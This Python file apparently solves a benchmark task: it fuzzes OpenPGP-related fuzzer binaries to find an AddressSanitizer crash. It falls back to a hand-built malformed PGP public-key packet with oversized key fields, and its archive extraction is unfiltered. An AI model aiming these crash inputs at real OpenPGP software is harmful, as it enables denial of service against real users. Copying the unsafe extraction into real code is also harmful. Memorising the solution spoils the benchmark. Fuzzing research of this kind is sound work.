import os
import tarfile
import zipfile
import tempfile
import subprocess
import time
import random
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir, tmp_dir = self._prepare_root(src_path)
        try:
            return self._generate_poc(root_dir)
        finally:
            if tmp_dir is not None:
                shutil.rmtree(tmp_dir, ignore_errors=True)

    def _prepare_root(self, src_path):
        if os.path.isdir(src_path):
            return src_path, None
        tmp_dir = tempfile.mkdtemp(prefix='pocgen_')
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, 'r:*') as tf:
                tf.extractall(tmp_dir)
        elif zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, 'r') as zf:
                zf.extractall(tmp_dir)
        else:
            return src_path, None
        return tmp_dir, tmp_dir

    def _find_elf_binaries(self, root):
        candidates = []
        for dirpath, dirnames, filenames in os.walk(root):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    with open(path, 'rb') as f:
                        magic = f.read(4)
                    if magic != b'\x7fELF':
                        continue
                except Exception:
                    continue
                score = 0
                lname = name.lower()
                lpath = path.lower()
                if 'fuzz' in lname or 'fuzzer' in lname:
                    score += 30
                if 'openpgp' in lname or 'pgp' in lname or 'gpg' in lname:
                    score += 40
                if 'fuzz' in lpath:
                    score += 10
                if os.access(path, os.X_OK):
                    score += 5
                if lname.endswith('.so') or lname.endswith('.a') or '.so.' in lname:
                    score -= 20
                size = os.path.getsize(path)
                if size < 1024:
                    score -= 10
                candidates.append((score, path))
        candidates.sort(reverse=True)
        return [p for score, p in candidates]

    def _collect_seeds(self, root, max_seed_files=50, max_seed_size=200000):
        seeds = []
        seen_hashes = set()
        for dirpath, dirnames, filenames in os.walk(root):
            dname = os.path.basename(dirpath).lower()
            if (
                'seed' in dname
                or 'corpus' in dname
                or dname in ('seeds', 'inputs', 'testdata', 'tests', 'cases', 'corpora')
            ):
                for name in filenames:
                    path = os.path.join(dirpath, name)
                    try:
                        size = os.path.getsize(path)
                        if size == 0 or size > max_seed_size:
                            continue
                        with open(path, 'rb') as f:
                            data = f.read()
                    except Exception:
                        continue
                    h = hash(data)
                    if h in seen_hashes:
                        continue
                    seen_hashes.add(h)
                    seeds.append(data)
                    if len(seeds) >= max_seed_files:
                        return seeds
        if not seeds:
            seeds = [
                b'',
                b'A',
                b'\x99',
                b'A' * 8,
                b'\x00' * 8,
                bytes(range(1, 32)),
            ]
        return seeds

    def _detect_invocation(self, binary_path, timeout=3.0):
        sample = b'init'
        patterns = ['libfuzzer', 'file', 'stdin']
        pattern_results = []

        for pattern in patterns:
            try:
                rc, out, err, to = self._run_with_pattern(binary_path, sample, pattern, timeout)
            except Exception:
                continue
            if to:
                pattern_results.append((pattern, True, rc))
                continue
            if rc == 0 and not self._is_sanitizer_crash(rc, out, err):
                return pattern
            pattern_results.append((pattern, False, rc))
        for pattern, timed_out, rc in pattern_results:
            if not timed_out:
                return pattern
        return 'libfuzzer'

    def _run_with_pattern(self, binary_path, data, pattern, timeout):
        if pattern in ('libfuzzer', 'file'):
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                tmp.write(data)
                tmp_path = tmp.name
            try:
                if pattern == 'libfuzzer':
                    cmd = [binary_path, '-runs=1', tmp_path]
                else:
                    cmd = [binary_path, tmp_path]
                try:
                    proc = subprocess.run(
                        cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout
                    )
                except subprocess.TimeoutExpired:
                    return -1, b'', b'', True
                except OSError:
                    return -1, b'', b'', True
                rc = proc.returncode
                out = proc.stdout
                err = proc.stderr
                return rc, out, err, False
            finally:
                try:
                    os.unlink(tmp_path)
                except OSError:
                    pass
        else:
            cmd = [binary_path]
            try:
                proc = subprocess.run(
                    cmd,
                    input=data,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=timeout,
                )
            except subprocess.TimeoutExpired:
                return -1, b'', b'', True
            except OSError:
                return -1, b'', b'', True
            return proc.returncode, proc.stdout, proc.stderr, False

    def _run_binary(self, binary_path, pattern, data, timeout=5.0):
        rc, out, err, to = self._run_with_pattern(binary_path, data, pattern, timeout)
        if to:
            return -1, b'', b''
        return rc, out, err

    def _is_sanitizer_crash(self, rc, out, err):
        if rc == 0:
            return False
        combined = out + err
        kws = [
            b'ERROR: AddressSanitizer',
            b'AddressSanitizer:',
            b'heap-buffer-overflow',
            b'heap-use-after-free',
            b'global-buffer-overflow',
            b'Sanitizer:',
        ]
        for kw in kws:
            if kw in combined:
                return True
        return False

    def _mutate_header_bytes(self, data, positions, interesting_values):
        ln = len(data)
        if ln == 0:
            return
        max_pos = min(positions, ln)
        for pos in range(max_pos):
            orig = data[pos]
            for v in interesting_values:
                if v == orig:
                    continue
                mutated = bytearray(data)
                mutated[pos] = v
                yield bytes(mutated)

    def _random_mutate(self, data, max_size=65536):
        if not data:
            data = b'\x00'
        arr = bytearray(data)
        if len(arr) > max_size:
            arr = arr[:max_size]
        operations = random.randint(1, 4)
        for _ in range(operations):
            op = random.randint(0, 5)
            if op == 0:
                idx = random.randrange(len(arr))
                arr[idx] ^= 1 << random.randrange(8)
            elif op == 1:
                idx = random.randrange(len(arr))
                arr[idx] = random.randrange(256)
            elif op == 2:
                idx = random.randrange(len(arr) + 1)
                insert_len = random.randint(1, 16)
                insert_bytes = os.urandom(insert_len)
                arr[idx:idx] = insert_bytes
                if len(arr) > max_size:
                    arr = arr[:max_size]
            elif op == 3 and len(arr) > 1:
                start = random.randrange(len(arr))
                end = min(len(arr), start + random.randint(1, min(16, len(arr) - start)))
                del arr[start:end]
                if not arr:
                    arr = bytearray(b'\x00')
            elif op == 4:
                if len(arr) < 2:
                    continue
                start = random.randrange(len(arr))
                end = min(len(arr), start + random.randint(1, min(32, len(arr) - start)))
                slice_bytes = arr[start:end]
                idx = random.randrange(len(arr) + 1)
                arr[idx:idx] = slice_bytes
                if len(arr) > max_size:
                    arr = arr[:max_size]
            elif op == 5:
                tail_len = random.randint(16, 256)
                b = random.choice([0x00, 0xFF, 0x41, 0x20])
                arr.extend([b] * tail_len)
                if len(arr) > max_size:
                    arr = arr[:max_size]
        return bytes(arr)

    def _mini_fuzz(self, binary_path, seeds, total_time_budget=22.0, max_tests=6000):
        if not seeds:
            seeds = [b'\x00']
        pattern = self._detect_invocation(binary_path)
        start = time.time()
        tests = 0

        interesting_vals = [
            0x00,
            0x01,
            0x02,
            0x03,
            0x04,
            0x05,
            0x10,
            0x11,
            0x12,
            0x13,
            0x14,
            0x15,
            0x16,
            0x17,
            0x18,
            0x19,
            0x1A,
            0x1B,
            0x20,
            0x21,
            0x22,
            0x40,
            0x7F,
            0xFF,
        ]
        max_seeds = min(len(seeds), 15)
        for seed_index in range(max_seeds):
            seed = seeds[seed_index]
            for mutated in self._mutate_header_bytes(
                seed, positions=32, interesting_values=interesting_vals
            ):
                if time.time() - start > total_time_budget or tests >= max_tests:
                    return None
                tests += 1
                rc, out, err = self._run_binary(binary_path, pattern, mutated)
                if self._is_sanitizer_crash(rc, out, err):
                    return mutated

        while time.time() - start < total_time_budget and tests < max_tests:
            base = random.choice(seeds)
            mutated = self._random_mutate(base)
            tests += 1
            rc, out, err = self._run_binary(binary_path, pattern, mutated)
            if self._is_sanitizer_crash(rc, out, err):
                return mutated
        return None

    def _generate_poc(self, root_dir):
        binaries = self._find_elf_binaries(root_dir)
        seeds = self._collect_seeds(root_dir)

        def bin_score(path):
            lname = os.path.basename(path).lower()
            score = 0
            if 'openpgp' in lname or 'pgp' in lname or 'gpg' in lname:
                score += 100
            if 'fuzz' in lname or 'fuzzer' in lname:
                score += 50
            return -score

        binaries.sort(key=bin_score)
        max_binaries = min(3, len(binaries))
        for i in range(max_binaries):
            poc = self._mini_fuzz(binaries[i], seeds)
            if poc is not None:
                return poc
        fallback = self._fallback_openpgp_like_payload()
        return fallback

    def _encode_new_packet_length(self, length: int) -> bytes:
        if length < 192:
            return bytes([length])
        elif length < 8384:
            length -= 192
            return bytes([(length // 256) + 192, length % 256])
        else:
            return b'\xFF' + length.to_bytes(4, 'big')

    def _fallback_openpgp_like_payload(self):
        version = 5
        creation_time = 0x5F3759DF
        pubkey_algo = 22
        body = bytearray()
        body.append(version)
        body.extend(creation_time.to_bytes(4, 'big'))
        body.append(pubkey_algo)
        for bits in (4096, 8192, 16384):
            body.extend(bits.to_bytes(2, 'big'))
            body.extend(b'\x04' * ((bits + 7) // 8))
        length = len(body)
        header = bytearray()
        header.append(0xC0 | 6)
        header.extend(self._encode_new_packet_length(length))
        pkt = header + body
        armor_header = b'-----BEGIN PGP PUBLIC KEY BLOCK-----\n'
        armor_footer = b'\n-----END PGP PUBLIC KEY BLOCK-----\n'
        filler = b'A' * 1024
        payload = armor_header + filler + b'\n' + pkt + armor_footer
        return bytes(payload)
